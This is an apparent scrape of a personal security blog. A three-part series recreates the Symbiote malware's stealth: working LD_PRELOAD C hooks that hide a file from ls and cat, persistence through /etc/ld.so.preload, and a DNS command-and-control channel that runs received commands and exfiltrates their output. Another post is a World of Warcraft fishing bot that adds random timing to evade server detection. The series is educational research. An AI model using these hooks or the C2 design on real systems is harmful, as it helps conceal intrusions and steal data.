[{"content":"Series Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1) Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2) (this one) Overview Following my last post about some evasion techniques that the Symbiote uses which I tried to recreate in their simplest form, this post will see how the Symbiote is communicating to the command and control C2 server.\nUpon reading the article, we can see that the Symbiote uses the DNS Protocol to exfiltrate data out of the infected machine, the way that it does that is by chunking it into a bunch of A Resource Records (RR) that it sends through the UDP. The A Record looks like this:\n{PACKET_NUMBER}.{MACHINE_ID}.{HEX_ENCODED_PAYLOAD}.{DOMAIN_NAME} I will deliberately skip the whole authentication process that the malware uses, since it gets out of the scope of the post.\nWhy DNS and not {arbitrary protocol}? DNS is being used in order to avoid/bypass the firewall rules and in some special scenarios that no TCP outgoing communication is possible.\nBypassing security products via DNS data exfiltration\nImplementation I will explain it briefly from the agent\u0026rsquo;s point of view. We are sending the C2 server a beam (in a shape of a DNS request) every n seconds to check if there is a command for us to execute if we receive a non empty Answer with a TXT Record (containing a command such as ls) we execute that command and after we have the output of the command, we exfiltrate it back to the C2 Server. This happens by sending multiple DNS A record questions (chunks) back to the server. I used the same format that the Symbiote uses for the records.\nNote: Each element of a domain name can contain up to 63 chars of information, a full domain name can contain 253 chars. More info\nAfter the server receives a request with the packet number and the total number of packets (that\u0026rsquo;s the first part of the message) it starts building the output message that we will see after we receive all the packets (through the {HEX_ENCODED_PAYLOAD} part of the message).\nCode / Demo Repository - The repository is created for a starting point to improve/build upon.\nThe repository contains both the agent and the server. When the server is being ran it sets the default handler dns.HandleFunc(\u0026quot;.\u0026quot;, AgentHandler) to handle any pattern for domain question this is for convenience, in some other cases you will want to specify some special handles.\nUsage Start the server $ go run main.go 127.0.0.1:8053 Start the agent $ go run ./agent/main.go Execute commands on the server side shell (In the case below simple dir). Note that I type cmd /C dir - Why? \u0026gt;\u0026lt;((((\u0026gt; dns c2 by syl \u0026lt;))))\u0026gt;\u0026lt; dnsc2\u0026gt; cmd /C dir Volume in drive C is OS Volume Serial Number is XXXX-XXXX Directory of C:\\code\\dnsc2\\agent 10/28/2022 08:40 PM \u0026lt;DIR\u0026gt; . 10/29/2022 11:03 PM \u0026lt;DIR\u0026gt; .. 10/28/2022 08:40 PM 481 go.mod 10/28/2022 08:40 PM 3,755 go.sum 10/30/2022 12:37 PM 1,762 main.go 3 File(s) 5,998 bytes 2 Dir(s) 107,561,959,424 bytes free Conclusion Please note that there could be some easier ways to do this, and some information can be wrong I did my best to research everything that I post here, if you find an error or if you think that something can be improved somewhere you can drop me a message!\nResources https://blogs.blackberry.com/en/2022/06/symbiote-a-new-nearly-impossible-to-detect-linux-threat https://stackoverflow.com/a/28918017 https://www.cloudflare.com/learning/dns/what-is-dns/ https://resources.infosecinstitute.com/topic/bypassing-security-products-via-dns-data-exfiltration/ ","permalink":"https://sy1.sh/posts/dns-c2-communcation/","summary":"Series Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1) Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2) (this one) Overview Following my last post about some evasion techniques that the Symbiote uses which I tried to recreate in their simplest form, this post will see how the Symbiote is communicating to the command and control C2 server.\nUpon reading the article, we can see that the Symbiote uses the DNS Protocol to exfiltrate data out of the infected machine, the way that it does that is by chunking it into a bunch of A Resource Records (RR) that it sends through the UDP.","title":"Using DNS as C2 Communication - Evasive Techniques (Part 3)"},{"content":"Series Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1) (this one) Using DNS as C2 Communication - Evasive Techniques (Part 3) Journey Post This post is a something that I call \u0026ldquo;journey post\u0026rdquo;, this follows my process of researching and implementing the solution for the problem (or the challenge). I will wrap/pre-fix parts of the post with html-like \u0026lt;journey\u0026gt; so that you can skip it if you are in a hurry.\nOverview In the last post I\u0026rsquo;ve described how I hid a file from all the sys calls that are using readdir. In this post I will try to hide it from the cat command. Let\u0026rsquo;s first examine/reverse engineer how the cat command works internally.\nNaturally I would start with a simple strace which will trace the system calls and signals that the command uses.\n$ which cat /usr/bin/cat $ strace /usr/bin/cat syl.lys execve(\u0026#34;/usr/bin/cat\u0026#34;, [\u0026#34;/usr/bin/cat\u0026#34;, \u0026#34;syl.lys\u0026#34;], 0x7ffca9c17508 /* 68 vars */) = 0 ... access(\u0026#34;/etc/ld.so.preload\u0026#34;, R_OK) = -1 ENOENT (No such file or directory) // WINK WINK, not yet ... openat(AT_FDCWD, \u0026#34;syl.lys\u0026#34;, O_RDONLY) = 3 The most interesting sys call in the output is openat so lets see the source code of openat.c. Here we can see the char const *file that variable is what holds our filename (look at the strace output). After that, I followed our steps in the last post by implementing a function with the same signature and wrapping the original one.\n\u0026lt;journey\u0026gt;\nAfter a few tries I was quick to realize that there is some issue. The wrapper that I\u0026rsquo;ve implemented didn\u0026rsquo;t work, or at least didn\u0026rsquo;t work all the time. I\u0026rsquo;ve tested it out with a simple program that would just call it and in there it worked, I didn\u0026rsquo;t quite get why it does what it does but I found the following discussions:\nintercepting the openat() system call for GNU tar How to find out what functions to intercept with LD_PRELOAD? As it turns out (my best guess) the sys call that I am trying to override openat is probably not the one that the cat uses. I decided to look at the source code for [cat.c][https://github.com/coreutils/coreutils/blob/master/src/cat.c] and search for everything that has *open* in it.\nI found on line 686 a call to the open. An important note here is that this open call here is not the sys call but the call in the std lib which will call the related system call for us. So I\u0026rsquo;ve decided to change my approach and override the open function instead.\n\u0026lt;/journey\u0026gt;\nHow does the open function work? I wouldn\u0026rsquo;t try to explain something that I am hardly good at so it is best for you to read the man pages for that one.\nLet\u0026rsquo;s start by copying the signature of the open function and wrap it.\nstatic int (*original_open)(const char *filename, int flags, ...) = NULL; int open (const char *filename, int flags, ...) { original_open = dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); return original_open(filename, flags); } In this code block I\u0026rsquo;ve wrapped the original open function with our implementation of the open function. What is left now is to add our \u0026ldquo;malicious\u0026rdquo; part to it.\nif (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; // Setting up the error to be ERROR NO ENTRY(ENOENT) return -1; // Returning -1 (failure) } And lastly all together\nintercept_open.c\n#define _GNU_SOURCE #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #define MALICIOUS_FILE \u0026#34;syl.lys\u0026#34; static int (*original_open)(const char *filename, int flags, ...) = NULL; int open (const char *filename, int flags, ...) { if (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; return -1; } original_open = dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); return original_open(filename, flags); } Let\u0026rsquo;s see if its working\u0026hellip;\n$ ls intercept_open.so syl.lys $ LD_PRELOAD=./intercept_open.so cat syl.lys cat: syl.lys: No such file or directory As you can see the cat command returns No such file or directory which is exactly what we are aiming for.\nCombining it with our readdir We created a malicious open function that wraps the original one from the standard lib, lets now combine it with the readdir from the previous post into a single shared object.\nmalicious.c\n#define _GNU_SOURCE #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define MALICIOUS_FILE \u0026#34;syl.lys\u0026#34; static int (*original_open)(const char *filename, int flags, ...) = NULL; struct dirent *(*original_readdir)(DIR *dirp) = NULL; int open (const char *filename, int flags, ...) { if (strcmp(filename, MALICIOUS_FILE) == 0) { errno = ENOENT; return -1; } original_open = dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); return original_open(filename, flags); } struct dirent *readdir(DIR *dirp) { struct dirent *ret; original_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); while((ret = original_readdir(dirp))) { if(strstr(ret-\u0026gt;d_name, MALICIOUS_FILE) == 0) break; } return ret; } Let\u0026rsquo;s test it out, supposedly we shouldn\u0026rsquo;t get entries from ls and cat.\n$ touch syl.lys $ ls intercept_open.c malicious.c malicious.so syl.lys $ export LD_PRELOAD=./malicious.so $ ls intercept_open.c malicious.c malicious.so README.md $ cat syl.lys cat: syl.lys: No such file or directory End With that I am concluding this post, again if you reached here thank you so much it means a lot! In the next part I will get deeper and make our malicious file to be running and beaconing a malicious C2 server, we will look through some C2 communication examples using the DNS protocol so that we can remain under the radar(or the firewall ^^).\nFull Source Code\nResources This post wouldn\u0026rsquo;t be possible without:\nhttps://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-5.html https://linux.die.net/man/2/openat And some kind StackOverflow users! ","permalink":"https://sy1.sh/posts/dynamic-linker-hijacking-experiments-2/","summary":"Series Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1) (this one) Using DNS as C2 Communication - Evasive Techniques (Part 3) Journey Post This post is a something that I call \u0026ldquo;journey post\u0026rdquo;, this follows my process of researching and implementing the solution for the problem (or the challenge). I will wrap/pre-fix parts of the post with html-like \u0026lt;journey\u0026gt; so that you can skip it if you are in a hurry.","title":"Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)"},{"content":"Series (this one) Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2) Using DNS as C2 Communication - Evasive Techniques (Part 3) Overview Recently I heard about a new malware called Symbiote, which the researches are calling the \u0026ldquo;Nearly-Impossible-to-Detect Linux Threat\u0026rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I\u0026rsquo;ve started to research it.\nI highly advise you to read through these articles first before we begin with the actual post:\nHijack Execution Flow: Dynamic Linker Hijacking What Is the LD_PRELOAD? What is a Shared Library? Implementation I decided to implement a very simple alternative of the evasive techniques that this malware uses just as a proof of concept and if you already read the articles that I\u0026rsquo;ve linked, it is apparent that we have to implement a shared library, that will override some symbols defined in the Linux Kernel.\nWhat do we need first and how to hide a file from lets say a command like ls? With a little bit of investigating of how the ls works internally through the source code and the linux manual page We can see that internally we have a function that is called print_dir. I\u0026rsquo;ve truncated the comments of the original source code.\n... static void print_dir (char const *name, char const *realname, bool command_line_arg) ... If we continue further down the function we can see the loop that actually iterates over the files\n... while (true) { errno = 0; next = readdir (dirp); // Here we can see that the loop iterates over readdir as long // as the pointer that readdir returns isn\u0026#39;t null and the errno != 0 if (next) { if (! file_ignored (next-\u0026gt;d_name)) // we can see here that it the filename is // taken from the next variable, lets look through the source code of `readdir` { ... Let\u0026rsquo;s confirm that by invoking nm this will show us the dynamic symbols that are being loaded from shared libs.\n$ nm -D /usr/bin/ls | grep \u0026#34;readdir\u0026#34; U readdir@GLIBC_2.2.5 Now I concluded that I need to search into the source code of readdir which is located here and the linux manual page. The description more or less describes exactly what we concluded from the source code of ls.c. Lets see where we set that d_name variable.\n#include \u0026lt;dirent.h\u0026gt; struct dirent *readdir(DIR *dirp); // Signature of the readdir struct dirent { ino_t d_ino; /* Inode number */ off_t d_off; /* Not an offset; see below */ unsigned short d_reclen; /* Length of this record */ unsigned char d_type; /* Type of file; not supported by all filesystem types */ char d_name[256]; /* Null-terminated filename */ }; ⚠️ This reverse engineering/looking up the code might be a little bit tricky because of the different implementations of the dirent structure, if you look through some other source codes you may look at some slightly different structures. In this case the number of chars in the array is 256 but that might change to some other values. And you can always count that d_name will exists since this field must be implemented on all POSIX systems.\nAlright, let\u0026rsquo;s start implementing our own function readdir that we will wrap the original one with.\nintercept_readdir.c\n#define _GNU_SOURCE #include \u0026lt;dirent.h\u0026gt; // Including the Directory Entry structure // The dynamic linking header file so we can use the dlsym // which will give us the address for the readdir symbol #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; // So we can use the strstr struct dirent *readdir(DIR *dirp) { struct *(handle)(DIR *); // https://man7.org/linux/man-pages/man3/dlsym.3.html // Search for RTLD_NEXT, basically it allow us to wrap // the original function handle = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;) struct dirent *dp; // Iterating over the return values of our original `readdir` while((dp = handle(dirp))) { // if our `needle`(our file `syl.lys`) is found in the `haystack`(`dp-\u0026gt;d_name`) // break the loop and go to the next entry, essentially skipping our file. if(strstr(dp-\u0026gt;d_name, \u0026#34;syl.lys\u0026#34;) == 0) break; } return dp; } This is what our final version of wrapper for readdir would look like. Now let\u0026rsquo;s try to compile it.\n$ gcc libhidemyfile.c -fPIC -shared -o libhidemyfile.so -ldl Flags:\nfPIC -shared creates a shared object -D_GNU_SOURCE flag / _GNU_SOURCE - TLDR: We need it for RTLD_NEXT -ldl Now that we have shared object (*.so) file lets see how to use it in action.\nHow to overwrite the exported symbols? LD_PRELOAD What is LD_PRELOAD? I advise you to read that first to get a better understanding of how it works.\nThe next thing that we are going to do is to test our shared library and see if it works. Lets run ls with our libhidemyfile.so loaded before anything else.\n$ ls libhidemyfile.so syl.lys $ LD_PRELOAD=./libhidemyfile.so ls libhidemyfile.so As you can see we successfully implement a shared library that hides our file from ls, and not only that command, every command that uses readdir won\u0026rsquo;t be able to list our file as long as we load our shared library. So in that case we must think of a persistent way of how to load it without typing LD_PRELOAD in front of every command.\n/etc/ld.so.preload If you read carefully the man pages for LD_PRELOAD you should know that you won\u0026rsquo;t be able to override functions in the standard search directories without properly setting your set-user-ID permissions.\nInstead we are going to use the /etc/ld.so.preload which does not suffer from these restrictions. This suffers from requiring root privileges but c\u0026rsquo;mon.. if you are here you will get those!\nWe first need to move our shared library file in some root directory, preferably /lib/ since..it is a library.\n$ sudo mv ./libhidemyfile.so /lib/libhidemyfile.so Then we just need to place our library dir in ld.so.preload file.\n$ sudo echo \u0026#34;/lib/libhidemyfile.so\u0026#34; \u0026gt; /etc/ld.so.preload And if everything is good, executing ls or any of its aliases will hide our file from the output. Let\u0026rsquo;s verify this by using ldd\n$ ldd /bin/ls linux-vdso.so.1 (0x00007ffc0c8e2000) /lib/libhidemyfile.so (0x00007f00e59e4000) \u0026lt;--- Here it is! libselinux.so.1 =\u0026gt; /lib64/libselinux.so.1 (0x00007f00e5997000) libcap.so.2 =\u0026gt; /lib64/libcap.so.2 (0x00007f00e598d000) libc.so.6 =\u0026gt; /lib64/libc.so.6 (0x00007f00e5600000) libpcre2-8.so.0 =\u0026gt; /lib64/libpcre2-8.so.0 (0x00007f00e58f0000) /lib64/ld-linux-x86-64.so.2 (0x00007f00e5a0f000) For your convenience I\u0026rsquo;ve setup a Docker container that you can use with ld.so.preload setup\n$ docker run -it --rm sylly/ctf_findme End If you reached here, thank you so much for the read. In the next part I will try to \u0026ldquo;completely\u0026rdquo; hide it from the system because now if we cat it despite not \u0026ldquo;reading\u0026rdquo; it in the directory would print us the contents of the file, but that will be the subject of the next post.\nFull Source Code\nResources This post wouldn\u0026rsquo;t be possible without:\nhttps://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/ https://www.exploit-db.com/docs/english/31687-dynamic-link-library-hijacking.pdf https://attack.mitre.org/techniques/T1574/006/ https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/ https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/ https://blog.jessfraz.com/post/ld_preload/ ","permalink":"https://sy1.sh/posts/dynamic-linker-hijacking-experiments/","summary":"Series (this one) Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2) Using DNS as C2 Communication - Evasive Techniques (Part 3) Overview Recently I heard about a new malware called Symbiote, which the researches are calling the \u0026ldquo;Nearly-Impossible-to-Detect Linux Threat\u0026rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I\u0026rsquo;ve started to research it.\nI highly advise you to read through these articles first before we begin with the actual post:","title":"Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)"},{"content":" Recently I\u0026rsquo;ve been fascinated with a game called LegionTD2, this is a newly created game that I\u0026rsquo;ve been playing as a map ever since Warcraft 3, it is tactical multiplayer tower-defense(td). The game is based on predictions and timings, if you play your cards right (or in the context of the game: sends/workers/units) you will prevail over the enemy team. Read more about it here.\nLegionTD SDK I\u0026rsquo;ve doing stuff in Go in my free time (mainly code challenges) for a while now and I\u0026rsquo;ve decided that I should spend some time creating something useful for myself such as creating tools that would help me get better at the game. The game has an API which resides here, there are couple of endpoints that are useful for helpful statistics such as the player/* and games/* endpoints. I knew that I will be querying the API a lot for fetching info about players and games, so I\u0026rsquo;ve decided to create an SDK for that so I can ease my work a little bit. And after couple of weeks free time work I\u0026rsquo;ve created the LegionTD 2 SDK for Go.\nFunctionality Analyze games While my ultimate goal is to create set of analytics tools for Legion, I\u0026rsquo;ve created the most basic example of how that might happen using SQLite3 and Go.\nUnder the examples/analyze_games/ I\u0026rsquo;ve created an example that fetches about 3k games and put them into a SQLite database, after that you are able to analyze the data using SQL. I\u0026rsquo;ve created a simple query that gets the percentage of games that are being finished at waves 15, 13 and 10.\nIn my case here are the results, games finished at wave\nWave 15 Wave 13 Wave 10 20% 14% 4% Exporting the games You can derive that from the previous example but I\u0026rsquo;ve created a dedicated examples for both exporting to JSON and exporting to SQL.\nExport games to SQL Export games to JSON Fetching all of the Units Since that the game hasn\u0026rsquo;t got a dedicated route for fetching all the units I\u0026rsquo;ve created a simple example that resides in the repository under examples/get_all_units. The important thing here is that I\u0026rsquo;ve exported all the units into a single txt file and then I just spawn requests for each unit.\nConclusion I will be updating the SDK as I am progressing with the analytical tools and I will be adding new examples and adding new posts as I am doing it. For now you can keep an eye on the repository and I will be definitely posting/discussing more about it in the Discord Channel.\n","permalink":"https://sy1.sh/posts/legiontd2-sdk/","summary":"Recently I\u0026rsquo;ve been fascinated with a game called LegionTD2, this is a newly created game that I\u0026rsquo;ve been playing as a map ever since Warcraft 3, it is tactical multiplayer tower-defense(td). The game is based on predictions and timings, if you play your cards right (or in the context of the game: sends/workers/units) you will prevail over the enemy team. Read more about it here.\nLegionTD SDK I\u0026rsquo;ve doing stuff in Go in my free time (mainly code challenges) for a while now and I\u0026rsquo;ve decided that I should spend some time creating something useful for myself such as creating tools that would help me get better at the game.","title":"LegionTD2 Go SDK (v0.2.0)"},{"content":"There are some use-cases where a plugin architecture is needed, I call this \u0026ldquo;code\u0026rdquo; plugins but it is quite possible that there is already a word for that. The idea is to \u0026rsquo;load\u0026rsquo; functions or classes that are dynamically created so that you can have the reference to the instances at runtime. I\u0026rsquo;ve created 2 solutions for that matter one that is using the __subclasses__ dunder method and one using a decorator.\nSolution 1 Repository: https://github.com/syrull/plugin-arch-python/tree/main/Solution-1\nSOLUTION-1 │ configuration.py │ main.py │ README.md │ setup.py │ └───actions action_example1.py action_example2.py __init__.py Loading the __subclasses__ of the BaseAction class and creating a \u0026lsquo;pluggable\u0026rsquo; classes. The actions can be specified in the configuration.py file in the ACTIONS const. This method is inspired by django\u0026rsquo;s INSTALLED_APPS method.\nThe call method is a placeholder for the \u0026ldquo;actions\u0026rdquo;.\nTo Register an action New python file in actions/ folder Create a class with an appropriate name (ex. ClickAction) Extend the class with BaseAction Add an entry to ACTIONS const located in configuration.py file with the approriate path to the module After that the function will be available at the register in the main.py file.\n$ python main.py [\u0026lt;class \u0026#39;actions.action_example1.Example1Action\u0026#39;\u0026gt;, \u0026lt;class \u0026#39;actions.action_example2.Example2Action\u0026#39;\u0026gt;] Benchmarks Measure-Command { python .\\main.py } Days : 0 Hours : 0 Minutes : 0 Seconds : 0 Milliseconds : 24 Ticks : 240745 TotalDays : 2.78640046296296E-07 TotalHours : 6.68736111111111E-06 TotalMinutes : 0.000401241666666667 TotalSeconds : 0.0240745 TotalMilliseconds : 24.0745 Solution 2 Repository: https://github.com/syrull/plugin-arch-python/tree/main/Solution-2\nSOLUTION-2 │ main.py │ README.md │ register.py │ └───actions action_example1.py action_example2.py __init__.py The benefits of this solution are that we have a control over the decorator and we can pass some custom *args, **kwargs to the decorated functions.\nTo Register an action New python file in actions/ folder Create function with an appropriate name (ex. action_onclick) Decorate the function with register_action decorator Export the function in the __all__ method in actions/__init__.py file After that the function will be available at the register in the main.py file.\n$ python main.py [\u0026lt;function action_example1 at 0x000001CC3F88D310\u0026gt;, \u0026lt;function action_example2 at 0x000001CC3F88D3A0\u0026gt;] Benchmarks Measure-Command { python .\\main.py } Days : 0 Hours : 0 Minutes : 0 Seconds : 0 Milliseconds : 22 Ticks : 227803 TotalDays : 2.6366087962963E-07 TotalHours : 6.32786111111111E-06 TotalMinutes : 0.000379671666666667 TotalSeconds : 0.0227803 TotalMilliseconds : 22.7803 ","permalink":"https://sy1.sh/posts/create-plugin-architecture-with-python/","summary":"There are some use-cases where a plugin architecture is needed, I call this \u0026ldquo;code\u0026rdquo; plugins but it is quite possible that there is already a word for that. The idea is to \u0026rsquo;load\u0026rsquo; functions or classes that are dynamically created so that you can have the reference to the instances at runtime. I\u0026rsquo;ve created 2 solutions for that matter one that is using the __subclasses__ dunder method and one using a decorator.","title":"Create Plugin Architecture With Python"},{"content":"This fishing bot consists only of about 50 lines of code, it incorporates the mechanics of World of Warcraft and some simple Windows API Calls.\nRepository: https://github.com/syrull/simple-fishing-bot\nOverview The bot has about ~99% success rate, there are some extremely rare cases where the bot won\u0026rsquo;t catch it and I will explain why later. The method that the bot is using, should work in almost any fishing scenario in the game, I would personally avoid crowded places. The testing has been done in the current expansion (Shadowlands).\nThe bot is running on the currently Active Window, I haven\u0026rsquo;t performed checks wether this is the window of the game or not. It waits for about 2 seconds before it starts.\nMetrics Zereth Mortis: 29m 33s Items Looted: 161 That means that we loot roughly about ~5.4 fish per minute.\nInstallation \u0026amp; Usage Check the requirements.txt, for the Python Requirements and install them via pip install -r requirements.txt. The tests are done under Python3.10 however I believe everything should work with Python\u0026gt;=3.6.\nSet the bait Before using the bot, you need to supply it with an image of the bait. The image has to be on the bottom parts of the bait. Here is an example image, the green area indicates what would be a good image of the bait, it needs to be as small as possible.\nSave the image and place it at the root of the script as bait.png, additionally you can adjust the variable BAIT_IMAGE in the `fishingbot.py.\n⚠️ It is important for you to take the photo because of the graphical/display settings which can be different for each computer.\nFine-tune the script The fine tunning that you have to do consists of:\nFISHING_BUTTON = \u0026#34;b\u0026#34; TUNE_BAIT_MOUSE_UNDER_PX = 35 EDGE_RESET = 10, 10 ACTIVE_AFTER = 2 CONFIDENCE = 0.7 Variable Description FISHING_BUTTON The button that you use for fishing, in my case it was b TUNE_BAIT_MOUSE_UNDER_PX The offset pixels where the mouse is going to be whenever there is a bait, see the How it works? section EDGE_RESET Those are the x, y coordinates to reset the mouse after catching the fish, it is used to improve the success rate, leave it at 10, 10 ACTIVE_AFTER The bot simply waits 2 secs before it starts CONFIDENCE The confidence of the template matching How it works? The method is extremely simple, it utilizes two things. The first one is the Template Matching, this is what pyautogui.locateOnScreen uses under the hood and the second one is the PyGetCursorInfo function which is exposed by the win32gui lib.\nThe solution lies in the gif from the beginning, whenever the bobber actually catches a fish the AoE (Area of Effect) for the bobber becomes bigger allowing us to detect a change on the cursor, then we use the GetCursorInfo to catch the change of the cursor and if it becomes a different tuple from the default one which we set when there is nothing active on our cursor. Then we execute the click.\nNow about the fine-tuning, look at this example\nThe TUNE_BAIT_MOUSE_UNDER_PX variable which doesn\u0026rsquo;t have the best name ever is indicated with red, in simple terms it is how many pixels under the located bobber to place the mouse. For myself the range between 28-32 works the best, but as I said earlier this could differ.\nEdge cases There is a rare edge case when the default tuple for the cursor doesn\u0026rsquo;t change which happens if the script isn\u0026rsquo;t tune right, I\u0026rsquo;ve solved this by resetting the cursor at x=10, y=10 position of the screen and then bringing it back. In a case when the cursor\u0026rsquo;s icon doesn\u0026rsquo;t change and if it sits with the bait icon the bot would just wait the duration of the fishing and reset itself.\nAdditional features I\u0026rsquo;ve added a bit of randomness in the timings between each press of the fishing and the click of the bobber with additionally pressing space every now and then. Apparently the server can detect that something fishy is going on when this randomness is removed.\n","permalink":"https://sy1.sh/posts/simple-fishing-bot/","summary":"This fishing bot consists only of about 50 lines of code, it incorporates the mechanics of World of Warcraft and some simple Windows API Calls.\nRepository: https://github.com/syrull/simple-fishing-bot\nOverview The bot has about ~99% success rate, there are some extremely rare cases where the bot won\u0026rsquo;t catch it and I will explain why later. The method that the bot is using, should work in almost any fishing scenario in the game, I would personally avoid crowded places.","title":"Simple Fishing Bot for World of Warcraft"},{"content":"Introduction STIX What is STIX and what is TAXII? In the most simple terms STIX is a model of Threat Intelligence that is represented in motivations, abilities, capabilities and response objects. Those objects are then represented in either JSON (STIX 2) or XML (STIX 1).\nHere is a very simple representation of STIX Objects in a graph. Explanation of the example\nThe data can be helpful for preventing or mitigating various kinds of attacks that can be expressed with STIX. All the list of the examples you can find in their official example page.\nTAXII The STIX data has to be relayed in some way, that\u0026rsquo;s why we have the TAXII Server. It is a simple web server specifically created for storing and sharing that kind of data.\nTAXII 1.x Structure The TAXII 1.2 Server has the following structure:\nDiscovery Service - Within a POST request to their discovery URL (which should be pointed by the Server maintainers). Collection Management URL - The service that has the collections with STIX objects. Channels - Push/Subscribe pattern. The full list of features for TAXII1 can be found in their official documentation:\nhttps://docs.oasis-open.org/cti/taxii/v1.1.1/taxii-v1.1.1-part3-http.html https://taxiiproject.github.io/releases/1.1/TAXII_Overview.pdf https://www.oasis-open.org/committees/download.php/57324/OASIS TAXII 2.x Structure For the newer versions of the TAXII Server we have the following structure:\n/discovery - Discovers the paths to the different services provided by the Server. api_roots - Provides the API URLs for the different types of Collection Management. collections - Provides the available collections for the given api_root. collection/objects - Provides a list of STIX Objects in a given collection You can see that this is very similar to the TAXII 1.x servers, there isn\u0026rsquo;t much of a difference in the structure besides that the collection_management_url is api_root in TAXII 2.x.\nThe full list of features for TAXII2 can be found in their official documentation.\nTAXII Servers and Threat Intelligence Providers The information about this is very scarce so I\u0026rsquo;ve gathered a quick list of the known providers for STIX data.\nResource URL Description Data Type AlienVault OTX https://otx.alienvault.com/api Requires an account, provides data in various ways including a TAXII Server. STIX 1.x Threat Connect https://threatconnect.com/stix-taxii/ Requires an account, Paid service, (consumes and provides) threat intel. STIX 1.x/2.x EcleticIQ https://www.taxiistand.com/ Test TAXII (v1x) server. (quite unstable and inconsistent) STIX 1.x Limo - Anomali https://www.anomali.com/resources/limo Test TAXII (v1x/v2x) server. Somewhat unstable but mostly fine during tests. STIX 1.x/2.x Tools for STIX/TAXII The main tool for creating/parsing or generating STIX data is going to be Python, since that all of the tools created are written in Python. Of course there are other alternatives but currently that\u0026rsquo;s the most common one.\nOther tools that might come in handy.\nTool Description Version stix-shifter Translates STIX to various other Threat Intelligence formats such as Carbon Black Cloud Query and others STIX 1.x/2.x stix2 The main python package to parse and use/create STIX2 data. STIX 2.x stix2-validator Provides a validation for the STIX2 data, can be used to validate your data from your sources. STIX 2.x stix2-slider Transforms STIX2 content to STIX1.2 STIX 2.x stix2-elevator Transforms STIX1 data to STIX2.x STIX 1.x stix The main python package for STIX1 data. STIX 1.x stix-validator Validating STIX1 data. STIX 1.x stix2-patterns Validator and Pattern Parser for STIX 2.x Patterns STIX 2.x taxii2-client Python Client for TAXII 2 Servers TAXII 2.x cabby Python Client for TAXII 1 Servers TAXII 1.x Snippets and Gists https://gist.github.com/syrull/6a2614560fb0474df166a51bcb34990d (Creating a TAXII2 Client for LimoAnomali) https://gist.github.com/syrull/73b1798f90c4109a13ef9fceb1f2f858 (Creating a TAXII1 Client for OTXAlienVault) ","permalink":"https://sy1.sh/posts/stix-taxii-complete-knowledge/","summary":"Introduction STIX What is STIX and what is TAXII? In the most simple terms STIX is a model of Threat Intelligence that is represented in motivations, abilities, capabilities and response objects. Those objects are then represented in either JSON (STIX 2) or XML (STIX 1).\nHere is a very simple representation of STIX Objects in a graph. Explanation of the example\nThe data can be helpful for preventing or mitigating various kinds of attacks that can be expressed with STIX.","title":"STIX/TAXII - Complete Knowledge"},{"content":"Quick notes about how to forward an ssh agent and other tricks regarding the installation of python packages.\nUsing SSH Forwarding Exporting the $SSH_AUTH_SOCK environment variable in the image.\n$ docker run -rm -t -i -v $(dirname $SSH_AUTH_SOCK) -e SSH_AUTH_SOCK=$SSH_AUTH_SOCK ubuntu /bin/bash Or in the environment section of a compose file.\nenvironment: SSH_AUTH_SOCK: $SSH_AUTH_SOCK Eventual Issues with that Installing ssh in the container Adding entries to /etc/ssh/ssh_known_hosts Caveats Traces of ssh keys inside the image References https://gist.github.com/d11wtq/8699521 https://vsupalov.com/build-docker-image-clone-private-repo-ssh-key/ https://medium.com/@bmihelac/examples-for-building-docker-images-with-private-python-packages-6314440e257c ","permalink":"https://sy1.sh/posts/installing-private-packages-in-docker-image-notes/","summary":"Quick notes about how to forward an ssh agent and other tricks regarding the installation of python packages.\nUsing SSH Forwarding Exporting the $SSH_AUTH_SOCK environment variable in the image.\n$ docker run -rm -t -i -v $(dirname $SSH_AUTH_SOCK) -e SSH_AUTH_SOCK=$SSH_AUTH_SOCK ubuntu /bin/bash Or in the environment section of a compose file.\nenvironment: SSH_AUTH_SOCK: $SSH_AUTH_SOCK Eventual Issues with that Installing ssh in the container Adding entries to /etc/ssh/ssh_known_hosts Caveats Traces of ssh keys inside the image References https://gist.","title":"Installing Private Packages in Docker Image - Notes"},{"content":"Download PDF\nMy name is Dimitar Ganev and I am a software engineer interested in cyber security, malware development and malware analysis. Areas of expertise/interest include Python, Go, PowerShell, Building Pipelines, Debugging and Profiling. I am located in Bulgaria and I have worked as a remote engineer since 2019.\nIn my spare time I am frequently researching various topics such as cyber secuirty topics, reverse engineering, game hacking/cheating (only for educational purposes). You can find the results of those researches in my website.\nhttps://sy1.sh/\nSpeaker @VMware Explore 2022 (1 Sep 2022 in San Francisco, California) - Converting Third-Party Threat Intelligence into Carbon Black Cloud - Prerecorded version Software Experience VMware (Software Engineer) \u0026gt; 2021-09 - Present\nLanguages: [Python, Go, PowerShell, 